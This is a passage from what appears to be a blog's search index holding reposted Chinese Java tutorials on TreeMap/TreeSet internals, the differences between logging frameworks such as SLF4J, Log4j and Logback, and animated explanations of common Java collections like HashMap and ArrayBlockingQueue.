<span class="token operator">==</span> BLACK<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 情况6</span>                x <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 情况6</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">leftOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> BLACK<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">rightOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 情况7</span>                    <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// 情况7</span>                    <span class="token function">rotateLeft</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 情况7</span>                    sib <span class="token operator">=</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 情况7</span>                <span class="token punctuation">}</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> <span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 情况8</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 情况8</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">leftOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 情况8</span>                <span class="token function">rotateRight</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 情况8</span>                x <span class="token operator">=</span> root<span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 情况8</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">setColor</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h1><p>前面已经说过<code>TreeSet</code>是对<code>TreeMap</code>的简单包装，对<code>TreeSet</code>的函数调用都会转换成合适的<code>TreeMap</code>方法，因此<code>TreeSet</code>的实现非常简单。这里不再赘述。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// TreeSet是对TreeMap的简单包装</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">AbstractSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span>    <span class="token keyword">implements</span> <span class="token class-name">NavigableSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span><span class="token punctuation">,</span> Cloneable<span class="token punctuation">,</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> NavigableMap<span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span> m<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Dummy value to associate with an Object in the backing Map</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> Object PRESENT <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">TreeSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// TreeSet里面有一个TreeMap</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token operator">==</span>null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/5-TreeSet%20and%20TreeMap.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用日志框架(log4j，slf4j，logback)有啥区别</title>
      <link href="/2019/01/19/chang-yong-gong-ju/chang-yong-ri-zhi-kuang-jia-log4j-slf4j-logback-you-sha-qu-bie/"/>
      <url>/2019/01/19/chang-yong-gong-ju/chang-yong-ri-zhi-kuang-jia-log4j-slf4j-logback-you-sha-qu-bie/</url>
      
        <content type="html"><![CDATA[<h1 id="常用日志框架-log4j，slf4j，logback-有啥区别"><a href="#常用日志框架-log4j，slf4j，logback-有啥区别" class="headerlink" title="常用日志框架(log4j，slf4j，logback)有啥区别"></a>常用日志框架(log4j，slf4j，logback)有啥区别</h1><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>相信目前大多数情况下，不管是开源框架或是平时我们工作编码中都离不开一种框架，它就是日志框架。因此本节就简单了解一下我们常用日志框架的区别。</p><h2 id="2、Commons-Logging"><a href="#2、Commons-Logging" class="headerlink" title="2、Commons Logging"></a>2、Commons Logging</h2><p>common-logging是apache提供的一个通用的日志接口，<br>在common-logging中，有一个Simple logger的简单实现，但是它功能很弱，所以使用common-logging，通常都是配合着log4j来使用；</p><p>Commons Logging定义了一个自己的接口 org.apache.commons.logging.Log，以屏蔽不同日志框架的API差异，这里用到了Adapter Pattern（适配器模式）。</p><h2 id="3、SLF4J"><a href="#3、SLF4J" class="headerlink" title="3、SLF4J"></a>3、SLF4J</h2><p>Simple Logging Facade for Java（SLF4J）用作各种日志框架（例如java.util.logging，logback，log4j）的简单外观或抽象，允许最终用户在部署时插入所需的日志框架。</p><p>要切换日志框架，只需替换类路径上的slf4j绑定。 例如，要从java.util.logging切换到log4j，只需将slf4j-jdk14-1.8.0-beta2.jar替换为slf4j-log4j12-1.8.0-beta2.jar</p><p>SLF4J不依赖于任何特殊的类装载机制。 实际上，每个SLF4J绑定在编译时都是硬连线的，以使用一个且只有一个特定的日志记录框架。 例如，slf4j-log4j12-1.8.0-beta2.jar绑定在编译时绑定以使用log4j。 在您的代码中，除了slf4j-api-1.8.0-beta2.jar之外，您只需将您选择的一个且只有一个绑定放到相应的类路径位置。 不要在类路径上放置多个绑定。</p><p>以下是slf4j 绑定其它日志组件的图解说明。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/常用工具/20181216142102250.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/常用工具/20181216142102250.png" alt="img"></a></p><p>因此，slf4j 就是众多日志接口的集合，他不负责具体的日志实现，只在编译时负责寻找合适的日志系统进行绑定。具体有哪些接口，全部都定义在slf4j-api中。查看slf4j-api源码就可以发现，里面除了public final class LoggerFactory类之外，都是接口定义。因此，slf4j-api本质就是一个接口定义。</p><p>总之，Slf4j更好的兼容了各种具体日志实现的框架，如图：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/常用工具/20181216143003494.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/常用工具/20181216143003494.png" alt="img"></a></p><h2 id="4、Log4j"><a href="#4、Log4j" class="headerlink" title="4、Log4j"></a>4、Log4j</h2><p>Apache Log4j是一个非常古老的日志框架，并且是多年来最受欢迎的日志框架。 它引入了现代日志框架仍在使用的基本概念，如分层日志级别和记录器。</p><p>2015年8月5日，该项目管理委员会宣布Log4j 1.x已达到使用寿命。 建议用户使用Log4j 1升级到Apache Log4j 2。</p><h2 id="5、Log4j2"><a href="#5、Log4j2" class="headerlink" title="5、Log4j2"></a>5、Log4j2</h2><p>Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些固有问题。</p><p>与Logback一样，Log4j2提供对SLF4J的支持，自动重新加载日志配置，并支持高级过滤选项。 除了这些功能外，它还允许基于lambda表达式对日志语句进行延迟评估，为低延迟系统提供异步记录器，并提供无垃圾模式以避免由垃圾收集器操作引起的任何延迟。</p><p>所有这些功能使Log4j2成为这三个日志框架中最先进和最快的。</p><h2 id="6、Logback"><a href="#6、Logback" class="headerlink" title="6、Logback"></a>6、Logback</h2><p>logback是由log4j创始人设计的又一个开源日志组件，作为流行的log4j项目的后续版本，从而替代log4j。</p><p>Logback的体系结构足够通用，以便在不同情况下应用。 目前，logback分为三个模块：logback-core，logback-classic和logback-access。</p><p>logback-core：模块为其他两个模块的基础。</p><p>logback-classic：模块可以被看做是log4j的改进版本。此外，logback-classic本身实现了SLF4J API，因此可以在logback和其他日志框架（如log4j或java.util.logging（JUL））之间来回切换。</p><p>logback-access：模块与Servlet容器（如Tomcat和Jetty）集成，以提供HTTP访问日志功能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我建议直接选择SLF4J而不是Log4j，commons logging，logback或java.util.logging</p><p>1、在开源库或内部库中使用SLF4J，将使其独立于任何特定的日志记录实现，这意味着无需为多个库管理多个日志记录配置，您的客户端将会很需要这一点。</p><p>2、SLF4J提供了基于占位符的日志记录，通过删除检查（isDebugEnabled（），isInfoEnabled（）等）来提高代码的可读性。</p><p>3、另外，临时字符串数量越少意味着垃圾收集器的工作量就越少，这意味着应用程序的吞吐量和性能会更好。</p><p>这些优势只是冰山一角，当您开始使用SL4J深入了解它时，您将看到更多的优点。 我强烈建议，Java中的任何新代码开发都应该使用SLF4J来记录日志。</p><p>本文转自：<a href="https://blog.csdn.net/u010647035/article/details/85037206" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图解Java常用数据结构</title>
      <link href="/2019/01/17/java/java-rong-qi/tu-jie-java-chang-yong-shu-ju-jie-gou/"/>
      <url>/2019/01/17/java/java-rong-qi/tu-jie-java-chang-yong-shu-ju-jie-gou/</url>
      
        <content type="html"><![CDATA[<h2 id="图解Java常用数据结构"><a href="#图解Java常用数据结构" class="headerlink" title="图解Java常用数据结构"></a>图解Java常用数据结构</h2><p>最近在整理数据结构方面的知识, 系统化看了下Java中常用数据结构, 突发奇想用动画来绘制数据流转过程.</p><p>主要基于jdk8, 可能会有些特性与jdk7之前不相同, 例如LinkedList LinkedHashMap中的双向列表不再是回环的.</p><p>HashMap中的单链表是尾插, 而不是头插入等等, 后文不再赘叙这些差异, 本文目录结构如下:</p><p> <img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717140301329-1795204354.png" alt="img"></p><h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><p>经典的双链表结构, 适用于乱序插入, 删除. 指定序列操作则性能不如ArrayList, 这也是其数据结构决定的.</p><p><strong>add(E) / addLast(E)</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717133746276-313211308.gif" alt="img"></p><p><strong>add(index, E)</strong></p><p>这边有个小的优化, 他会先判断index是靠近队头还是队尾, 来确定从哪个方向遍历链入.</p><pre class=" language-java"><code class="language-java"> <span class="token number">1</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> <span class="token punctuation">(</span>size <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">2</span>             Node<span class="token operator">&lt;</span>E<span class="token operator">></span> x <span class="token operator">=</span> first<span class="token punctuation">;</span> <span class="token number">3</span>             <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> index<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token number">4</span>                 x <span class="token operator">=</span> x<span class="token punctuation">.</span>next<span class="token punctuation">;</span> <span class="token number">5</span>             <span class="token keyword">return</span> x<span class="token punctuation">;</span> <span class="token number">6</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token number">7</span>             Node<span class="token operator">&lt;</span>E<span class="token operator">></span> x <span class="token operator">=</span> last<span class="token punctuation">;</span> <span class="token number">8</span>             <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> index<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token number">9</span>                 x <span class="token operator">=</span> x<span class="token punctuation">.</span>prev<span class="token punctuation">;</span><span class="token number">10</span>             <span class="token keyword">return</span> x<span class="token punctuation">;</span><span class="token number">11</span>         <span class="token punctuation">}</span></code></pre><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134043714-1008528320.gif" alt="img"></p><p><strong>靠队尾</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134100309-1487165805.gif" alt="img"></p><p><strong>get(index)</strong></p><p>也是会先判断index, 不过性能依然不好, 这也是为什么不推荐用for(int i = 0; i &lt; lengh; i++)的方式遍历linkedlist, 而是使用iterator的方式遍历.</p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134201828-1536755274.gif" alt="img"></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134212062-1192617618.gif" alt="img"></p><p><strong>remove(E)</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134240000-783801823.gif" alt="img"></p><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>底层就是一个数组, 因此按序查找快, 乱序插入, 删除因为涉及到后面元素移位所以性能慢.</p><p><strong>add(index, E)</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134402495-1450834113.gif" alt="img"></p><p><strong>扩容</strong></p><p>一般默认容量是10, 扩容后, 会length*1.5.</p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180718113204058-1401567917.gif" alt="img"></p><p><strong>remove(E)</strong></p><p>循环遍历数组, 判断E是否equals当前元素, 删除性能不如LinkedList.</p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134440963-1609104909.gif" alt="img"></p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>经典的数据结构, 底层也是数组, 继承自Vector, 先进后出FILO, 默认new Stack()容量为10, 超出自动扩容.</p><p><strong>push(E)</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134532106-566548837.gif" alt="img"></p><p><strong>pop()</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134546142-1425174736.gif" alt="img"></p><h3 id="后缀表达式"><a href="#后缀表达式" class="headerlink" title="后缀表达式"></a>后缀表达式</h3><p>Stack的一个典型应用就是计算表达式如 9 + (3 - 1) * 3 + 10 / 2, 计算机将中缀表达式转为后缀表达式, 再对后缀表达式进行计算.</p><p><strong>中缀转后缀</strong></p><ul><li>数字直接输出</li><li>栈为空时，遇到运算符，直接入栈</li><li>遇到左括号, 将其入栈</li><li>遇到右括号, 执行出栈操作，并将出栈的元素输出，直到弹出栈的是左括号，左括号不输出。</li><li>遇到运算符(加减乘除)：弹出所有优先级大于或者等于该运算符的栈顶元素，然后将该运算符入栈</li><li>最终将栈中的元素依次出栈，输出。</li></ul><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134649235-361366195.gif" alt="img"></p><p><strong>计算后缀表达</strong></p><ul><li>遇到数字时，将数字压入堆栈</li><li>遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算, 并将结果入栈</li><li>重复上述过程直到表达式最右端</li><li>运算得出的值即为表达式的结果</li></ul><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134706912-413651296.gif" alt="img"></p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>与Stack的区别在于, Stack的删除与添加都在队尾进行, 而Queue删除在队头, 添加在队尾.</p><p><strong>ArrayBlockingQueue</strong></p><p>生产消费者中常用的阻塞有界队列, FIFO.</p><p><strong>put(E)</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134917471-223068187.gif" alt="img"></p><p><strong>put(E) 队列满了</strong></p><pre class=" language-java"><code class="language-java"><span class="token number">1</span>         <span class="token keyword">final</span> ReentrantLock lock <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lock<span class="token punctuation">;</span><span class="token number">2</span>         lock<span class="token punctuation">.</span><span class="token function">lockInterruptibly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span>         <span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token number">4</span>             <span class="token keyword">while</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> items<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token number">5</span>                 notFull<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">6</span>             <span class="token function">enqueue</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">7</span>         <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span><span class="token number">8</span>             lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">9</span>         <span class="token punctuation">}</span></code></pre><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134930548-1581371083.gif" alt="img"></p><p><strong>take()</strong></p><p>当元素被取出后, 并没有对数组后面的元素位移, 而是更新takeIndex来指向下一个元素.</p><p>takeIndex是一个环形的增长, 当移动到队列尾部时, 会指向0, 再次循环.</p><pre class=" language-java"><code class="language-java"> <span class="token number">1</span>     <span class="token keyword">private</span> E <span class="token function">dequeue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">2</span>         <span class="token comment" spellcheck="true">// assert lock.getHoldCount() == 1;</span> <span class="token number">3</span>         <span class="token comment" spellcheck="true">// assert items[takeIndex] != null;</span> <span class="token number">4</span>         <span class="token keyword">final</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> items <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token number">5</span>         <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span> <span class="token number">6</span>         E x <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> items<span class="token punctuation">[</span>takeIndex<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">7</span>         items<span class="token punctuation">[</span>takeIndex<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span> <span class="token number">8</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>takeIndex <span class="token operator">==</span> items<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token number">9</span>             takeIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token number">10</span>         count<span class="token operator">--</span><span class="token punctuation">;</span><span class="token number">11</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>itrs <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token number">12</span>             itrs<span class="token punctuation">.</span><span class="token function">elementDequeued</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">13</span>         notFull<span class="token punctuation">.</span><span class="token function">signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">14</span>         <span class="token keyword">return</span> x<span class="token punctuation">;</span><span class="token number">15</span>     <span class="token punctuation">}</span></code></pre><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717134947090-1857674903.gif" alt="img"></p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>最常用的哈希表, 面试的童鞋必备知识了, 内部通过数组 + 单链表的方式实现. jdk8中引入了红黑树对长度 &gt; 8的链表进行优化, 我们另外篇幅再讲.</p><p><strong>put(K, V**</strong>)**</p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717135210703-312944088.gif" alt="img"></p><p><strong>put(K, V) 相同hash值</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717135235292-826682325.gif" alt="img"></p><p><strong>resize 动态扩容</strong></p><p>当map中元素超出设定的阈值后, 会进行resize (length * 2)操作, 扩容过程中对元素一通操作, 并放置到新的位置.</p><p>具体操作如下:</p><ul><li>在jdk7中对所有元素直接rehash, 并放到新的位置.</li><li>在jdk8中判断元素原hash值新增的bit位是0还是1, 0则索引不变, 1则索引变成”原索引 + oldTable.length”.</li></ul><pre class=" language-java"><code class="language-java"> <span class="token number">1</span>     <span class="token comment" spellcheck="true">//定义两条链</span> <span class="token number">2</span>     <span class="token comment" spellcheck="true">//原来的hash值新增的bit为0的链，头部和尾部</span> <span class="token number">3</span>     Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> loHead <span class="token operator">=</span> null<span class="token punctuation">,</span> loTail <span class="token operator">=</span> null<span class="token punctuation">;</span> <span class="token number">4</span>     <span class="token comment" spellcheck="true">//原来的hash值新增的bit为1的链，头部和尾部</span> <span class="token number">5</span>     Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> hiHead <span class="token operator">=</span> null<span class="token punctuation">,</span> hiTail <span class="token operator">=</span> null<span class="token punctuation">;</span> <span class="token number">6</span>     Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> next<span class="token punctuation">;</span> <span class="token number">7</span>     <span class="token comment" spellcheck="true">//循环遍历出链条链</span> <span class="token number">8</span>     <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token number">9</span>         next <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">;</span><span class="token number">10</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">&amp;</span> oldCap<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token number">11</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>loTail <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token number">12</span>                 loHead <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token number">13</span>             <span class="token keyword">else</span><span class="token number">14</span>                 loTail<span class="token punctuation">.</span>next <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token number">15</span>             loTail <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token number">16</span>         <span class="token punctuation">}</span><span class="token number">17</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token number">18</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>hiTail <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token number">19</span>                 hiHead <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token number">20</span>             <span class="token keyword">else</span><span class="token number">21</span>                 hiTail<span class="token punctuation">.</span>next <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token number">22</span>             hiTail <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token number">23</span>         <span class="token punctuation">}</span><span class="token number">24</span>     <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">=</span> next<span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">25</span>     <span class="token comment" spellcheck="true">//扩容前后位置不变的链</span><span class="token number">26</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>loTail <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token number">27</span>         loTail<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token number">28</span>         newTab<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> loHead<span class="token punctuation">;</span><span class="token number">29</span>     <span class="token punctuation">}</span><span class="token number">30</span>     <span class="token comment" spellcheck="true">//扩容后位置加上原数组长度的链</span><span class="token number">31</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>hiTail <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token number">32</span>         hiTail<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token number">33</span>         newTab<span class="token punctuation">[</span>j <span class="token operator">+</span> oldCap<span class="token punctuation">]</span> <span class="token operator">=</span> hiHead<span class="token punctuation">;</span><span class="token number">34</span>     <span class="token punctuation">}</span></code></pre><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717135330300-1394283875.gif" alt="img"></p><h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><p>继承自HashMap, 底层额外维护了一个双向链表来维持数据有序. 可以通过设置accessOrder来实现FIFO(插入有序)或者LRU(访问有序)缓存.</p><p><strong>put(K, V)</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717135428093-1692938646.gif" alt="img"></p><p><strong>get(K)</strong></p><p>accessOrder为false的时候, 直接返回元素就行了, 不需要调整位置. </p><p>accessOrder为true的时候, 需要将最近访问的元素, 放置到队尾.</p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717135449262-926868516.gif" alt="img"></p><p><strong>removeEldestEntry 删除最老的元素</strong></p><p><img src="https://images2018.cnblogs.com/blog/1285727/201807/1285727-20180717135601748-1338089287.gif" alt="img"></p><p>本文转载自: <a href="https://www.cnblogs.com/xdecode/p/9321848.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速排序-三数取中法</title>
      <link href="/2019/01/17/suan-fa/pai-xu/kuai-su-pai-xu-san-shu-qu-zhong-fa/"/>
      <url>/2019/01/17/suan-fa/pai-xu/kuai-su-pai-xu-san-shu-qu-zhong-fa/</url>
      
